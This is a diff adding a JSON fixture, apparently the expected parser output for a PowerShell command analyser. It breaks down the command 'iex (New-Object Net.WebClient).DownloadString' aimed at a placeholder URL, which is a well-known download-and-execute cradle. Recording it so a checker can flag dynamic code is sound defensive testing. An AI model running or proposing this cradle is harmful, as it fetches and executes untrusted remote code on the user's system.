@@ -1,0 +1,59 @@
+{
+ "ok": true,
+ "parse_errors": [],
+ "commands": [
+  {
+   "pos": [
+    0,
+    59
+   ],
+   "invoke": "",
+   "name": {
+    "kind": "bare",
+    "v": "iex"
+   },
+   "elements": [
+    {
+     "t": "other",
+     "ast": "InvokeMemberExpressionAst",
+     "text": "(New-Object Net.WebClient).DownloadString('http://x/a')"
+    }
+   ],
+   "redirects": [],
+   "stage": {
+    "index": 0,
+    "of": 1
+   },
+   "nested": false
+  },
+  {
+   "pos": [
+    5,
+    29
+   ],
+   "invoke": "",
+   "name": {
+    "kind": "bare",
+    "v": "New-Object"
+   },
+   "elements": [
+    {
+     "t": "str",
+     "kind": "bare",
+     "v": "Net.WebClient"
+    }
+   ],
+   "redirects": [],
+   "stage": {
+    "index": 0,
+    "of": 1
+   },
+   "nested": true
+  }
+ ],
+ "compound": [],
+ "dynamic": [
+  "InvokeMemberExpressionAst"
+ ],
+ "mode": "FullLanguage"
+}
